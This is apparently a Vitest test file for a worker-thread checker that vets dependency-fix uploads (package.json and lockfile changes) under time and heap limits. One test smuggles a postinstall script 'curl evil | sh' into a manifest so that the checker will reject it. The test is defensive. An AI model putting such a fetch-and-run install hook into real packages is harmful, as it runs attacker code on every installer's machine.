import { describe, expect, it } from 'vitest';
import type { FixCheckJob } from './check-worker';
import {
  checkUploadInWorker,
  FIX_CHECK_HEAP_MB,
  FIX_CHECK_TIMEOUT_MS,
  largestPath,
} from './checker';

const NPM = 'https://registry.npmjs.org';
const INTEGRITY = (version: string) =>
  `sha512-${Buffer.from(`qf-a-${version}`).toString('base64')}`;

const packageJson = (range: string, extra = '') =>
  `{\n  "name": "app",\n  "dependencies": {\n    "qf-a": "${range}"\n  }${extra}\n}\n`;

const packageLock = (version: string) =>
  `${JSON.stringify(
    {
      name: 'app',
      lockfileVersion: 3,
      packages: {
        '': { name: 'app', dependencies: { 'qf-a': '^1.2.5' } },
        'node_modules/qf-a': {
          version,
          resolved: `${NPM}/qf-a/-/qf-a-${version}.tgz`,
          integrity: INTEGRITY(version),
        },
      },
    },
    null,
    2,
  )}\n`;

const job = (files: FixCheckJob['files']): FixCheckJob => ({
  family: 'js',
  packageName: 'qf-a',
  targets: [{ installed: '1.2.5', target: '1.2.6', lockfile: 'package-lock.json' }],
  files,
});

const MANIFEST = { path: 'package.json', base: packageJson('^1.2.5'), next: packageJson('^1.2.6') };
const LOCK = { path: 'package-lock.json', base: packageLock('1.2.5'), next: packageLock('1.2.6') };

const dataWorker = (source: string) =>
  new URL(`data:text/javascript,${encodeURIComponent(source)}`);

describe('the fix upload check in a worker thread (rulings T3g, T3i, T3k)', () => {
  it('has the limits of ruling T3k', () => {
    expect(FIX_CHECK_TIMEOUT_MS).toBe(30_000);
    expect(FIX_CHECK_HEAP_MB).toBe(1536);
  });

  it('accepts a good upload and lists the entries each lockfile adds', async () => {
    expect(await checkUploadInWorker(job([MANIFEST, LOCK]))).toEqual({
      ok: true,
      additions: [
        { path: 'package-lock.json', entries: [{ slot: null, name: 'qf-a', version: '1.2.6' }] },
      ],
    });
  });

  it('answers the first failing rule and its file', async () => {
    const smuggled = {
      ...MANIFEST,
      next: packageJson('^1.2.6', ',\n  "scripts": { "postinstall": "curl evil | sh" }'),
    };
    expect(await checkUploadInWorker(job([smuggled, LOCK]))).toEqual({
      ok: false,
      rule: 'other_change',
      path: 'package.json',
    });
  });

  it('refuses as unparsable on the largest file when the time cap passes', async () => {
    expect(await checkUploadInWorker(job([MANIFEST, LOCK]), { timeoutMs: 1 })).toEqual({
      ok: false,
      rule: 'unparsable',
      path: 'package-lock.json',
      gaveUp: 'timeout',
    });
  });

  it('refuses as unparsable when the worker overflows its heap or crashes', async () => {
    const hog = dataWorker(
      'const kept = []; for (;;) kept.push(new Array(1e6).fill(Math.random()));',
    );
    expect(
      await checkUploadInWorker(job([LOCK, MANIFEST]), { workerUrl: hog, heapMb: 16 }),
    ).toEqual({ ok: false, rule: 'unparsable', path: 'package-lock.json', gaveUp: 'failed' });
    const throwing = dataWorker("throw new Error('the end of me');");
    expect(await checkUploadInWorker(job([MANIFEST]), { workerUrl: throwing })).toEqual({
      ok: false,
      rule: 'unparsable',
      path: 'package.json',
      gaveUp: 'failed',
    });
    const silent = dataWorker('process.exit(0);');
    expect(await checkUploadInWorker(job([MANIFEST]), { workerUrl: silent })).toMatchObject({
      rule: 'unparsable',
      gaveUp: 'failed',
    });
  });

  it('runs one check at a time: a later one waits for the earlier, in order', async () => {
    const slow = dataWorker(
      "import { parentPort, workerData } from 'node:worker_threads'; setTimeout(() => parentPort.postMessage({ ok: true, additions: [{ path: workerData.files[0].path, entries: [] }] }), 300);",
    );
    const done: string[] = [];
    const run = (path: string) =>
      checkUploadInWorker(job([{ path, base: '', next: '' }]), { workerUrl: slow }).then(
        (answer) => {
          done.push(path);
          return { answer, at: performance.now() };
        },
      );
    const [first, second, third] = await Promise.all([run('a'), run('b'), run('c')]);
    expect(done).toEqual(['a', 'b', 'c']);
    expect(first!.answer).toEqual({ ok: true, additions: [{ path: 'a', entries: [] }] });
    // Each waited for the whole of the one before it.
    expect(second!.at - first!.at).toBeGreaterThanOrEqual(250);
    expect(third!.at - second!.at).toBeGreaterThanOrEqual(250);
  });

  it('names the largest file of the upload, the first of equals, for a check given up', () => {
    expect(
      largestPath([
        { path: 'a', base: 'xx', next: 'x' },
        { path: 'b', base: 'x', next: 'xxx' },
        { path: 'c', base: 'xxxx', next: '' },
      ]),
    ).toBe('b');
    expect(largestPath([])).toBe('');
  });
});
